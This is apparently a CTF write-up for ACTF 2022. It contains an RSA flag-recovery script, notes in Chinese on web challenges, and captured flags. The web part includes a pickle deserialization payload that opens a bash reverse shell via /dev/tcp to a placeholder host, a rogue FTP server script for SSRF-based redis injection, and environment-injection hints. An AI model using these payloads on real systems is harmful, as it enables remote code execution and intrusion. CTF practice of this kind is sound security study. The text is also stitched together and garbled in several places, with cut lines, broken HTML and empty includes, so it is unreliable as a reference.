import json
import os
import gmpy2
from pwnlib.tubes.tube import *
from hashlib import *
from Crypto.Util.number import *
from tqdm import tqdm, trange
import random
import math
from Crypto.Hash import SHA256
from Crypto.Cipher import AES
from factordb.factordb import FactorDB
from sage.modules.free_module_integer import IntegerLattice
import itertools
from fastecdsa.curve import Curve
from random import getrandbits, shuffle
# r = remote('121.40.89.206', '21106')
# # context(log_level='debug')
# ALPHABET = string.ascii_letters + string.digits
# rec = r.recvline().decode()
# print(rec)
# suffix = rec[rec.find('+')+1:rec.find(')')][1:].strip()
# digest = rec[rec.find('==')+3:-1].strip()
# print(f"suffix: {suffix} \ndigest: {digest}")
# for i in itertools.product(ALPHABET, repeat=4):
#     prefix = ''.join(i)
#     guess = prefix + suffix
#     if sha256(guess.encode()).hexdigest() == digest:
#         # log.info(f"Find XXXX: {prefix}")
#         print((f"Find XXXX: {prefix}"))
#         break
# r.sendline(prefix.encode())
# def resultant(p1, p2, var):
#     p1 = p1.change_ring(QQ)
#     p2 = p2.change_ring(QQ)
#     var = var.change_ring(QQ)
#     r = p1.resultant(p2, var)
#     return r.change_ring(F)
N = 
318357383676969931376304372251348650316053308947071634848764911345082883022415182410605
056286864029171243328367979985589030694556243057213712826931894445304182547615491367684
965859964211389652529179852553372280511604167546267573299588167135959360258475130460224
441514985934687534036174077546362346750318682438578085192013636859372553577985472616868
717905130385179711123945126418327654461673682029805406323264135977512875307134047471472
053485829566042627835663074375824742291651968736242611444366098977451975123459181954712
928871986304197282440587221220811809357718465944655201708653100234066350921550186621229
4702743
e = 65537
c = 
484339480787082665584089008221318468394734723504052749582545662910171378795428062384594
564009583493152454474865096337492767460537868683151635834430302896079804490762672954832
480681225532378026680455881061936921029019363552776934498676083798992542005902524419866
456435118382338038282044506220239933631402465836503229520608608678010816872882332557763
807906533616951259715964488627441650070078400332701027565360565010590985239909912603521
236913493937251580289311742180919739194570783502579783382940998496905143282738294743241
455691403865844290428843364597894997056726334750102344031328936298562849823202491199748
72840
# ln, l = 122146249659110799196678177080657779971, 
90846368443479079691227824315092288065
# lp = 13648451618657980711
# lq = ln // lp
# lphi = (lp-1) * (lq-1)
# ld = inverse(e, lphi)
# l -= 0xdeadbeef
# for x in tqdm(range(1, 1 = PolynomialRing(ZZ)
# for i in tqdm(range(e)):
#     f = x*(i*x-1) - N
#     res = f.roots()
#     for root, _ in res:
#         root = root % n
#         if gcd(root, n) != 1:
#             print(root)
root = 
159875761393418887886488630005344176403006103104006672850959515252081456893645991190230
714140369010607466677903229784520821566802453159670278262377206089150931095520010336608
678085083075695314840901094293193694223521927821261078188897171339519236160779438846519
896223454355054287088077990812675517242390525689974559054946442845395987105954635384969
943959913105101747947610087476729620319019434076983483153140900301389018082472065200085
521783750351270111684901292245642667364215313067842537110558730086182435961367163254700
111688573747363037909128488097059338159461305378659832342167336418094937598474708897502
55306696
p = 
150465840847587996081934790667651610347742504431401795762471467800785876172317705268993
152743689967775266712089661128372295606682852482012493939368044600366794969553828079064
622047080051569090177885299781981209120854290564064662058027679075401901717932024549311
396484660557278975525859127898004619405319768113
q = n // p
phi = (p-1) * (q-1)
d = inverse(e, phi)
with open('/mnt/f/ctf/train/8f7eedbd3bb9441e892c5cde9435c4ec/flag', 'rb') as f:
    c = bytes_to_long(f.read())
print(long_to_bytes(int(pow(c, d, n))))
Web
poorui
直接登录成admin，发送getflag就getflag了
beWhatYouWannaBe
前16字节可通过csrf获取(让admin给⾃⼰赋予admin) csrf token可预测
后16字节可以使⽤这个获取 （https://portswigger.net/research/dom-clobbering-strikes-back）
connect ws://124.71.181.238:8081
{"api":"login","username":"admin"}
{"api":"getflag","to":"flagbot"}
ACTF{s0rry_for_4he_po0r_front3nd_ui_:)_4FB89F0AAD0A}
test' name=lll>">
    Document
    " method="post">
    test' name=lll>">
import socketserver,threading,time,base64,sys,os
import redis
import pickle
class RCE:
    def __reduce__(self):
        cmd = "bash -c 'bash -i >& /dev/tcp/server-ip/port 0>&1'"
        return os.system, (cmd,)
pickled = pickle.dumps(RCE())
print(base64.urlsafe_b64encode(pickled))
os.system('redis-server > /dev/null 2>&1 &')
time.sleep(2)
r = redis.Redis(host='127.0.0.1', port=6379, db=0)
data_len = str(len(pickled)).encode()
payload = b"\r\nset actfSession:112233 0 0 " + data_len + b"\r\n" + pickled + b"\r\n"
print('payload len: ', len(payload), file=sys.stderr)
# assert len(payload) run.log 2>&1 &')
class MyTCPHandler(socketserver.StreamRequestHandler):
    def handle(self):
        print('[+] connected', self.request, file=sys.stderr)
        self.request.sendall(b'220 (vsFTPd 3.0.3)\r\n')
        self.data = self.rfile.readline().strip().decode()
        print(self.data, file=sys.stderr,flush=True)
        self.request.sendall(b'230 Login successful.\r\n')
        self.data = self.rfile.readline().strip().decode()
        print(self.data, file=sys.stderr)
        self.request.sendall(b'200 yolo\r\n')
gogogo
LD_PRELOAD
https://tttang.com/archive/1399/
        self.data = self.rfile.readline().strip().decode()
        print(self.data, file=sys.stderr)
        self.request.sendall(b'200 yolo\r\n')
        self.data = self.rfile.readline().strip().decode()
        print(self.data, file=sys.stderr)
        self.request.sendall(b'257 "/" is the current directory\r\n')
        self.data = self.rfile.readline().strip().decode()
        print(self.data, file=sys.stderr)
        self.request.sendall(b'227 Entering Passive Mode (127,0,0,1,43,192)\r\n')
        self.data = self.rfile.readline().strip().decode()
        print(self.data, file=sys.stderr)
        self.request.sendall(b'227 Entering Passive Mode (127,0,0,1,43,192)\r\n')
        self.data = self.rfile.readline().strip().decode()
        print(self.data, file=sys.stderr)
        self.request.sendall(b'200 Switching to Binary mode.\r\n')
        self.data = self.rfile.readline().strip().decode()
        print(self.data, file=sys.stderr)
        self.request.sendall(b'125 Data connection already open. Transfer 
starting.\r\n')
        self.data = self.rfile.readline().strip().decode()
        print(self.data, file=sys.stderr)
        # 226 Transfer complete.
        self.request.sendall(b'250 Requested file action okay, completed.')
        exit()
def ftp_worker():
    with socketserver.TCPServer(('0.0.0.0', 2048), MyTCPHandler) as server:
        while True:
            server.handle_request()
ftp_worker()
# print(sess.get(url, params={'url': target}).text, file=sys.stderr)
&& make SHOW=1 ME_GOAHEAD_UPLOAD_DIR="'\\"/tmp\\"'" \\
加脏字符 改Content-Length Intruder爆破fd
ACTF{s1mple_3nv_1nj3ct1on_and_w1sh_y0u_hav3_a_g00d_tim3_1n_ACTF2022}
Misc
signin
#include 
#include 
#include 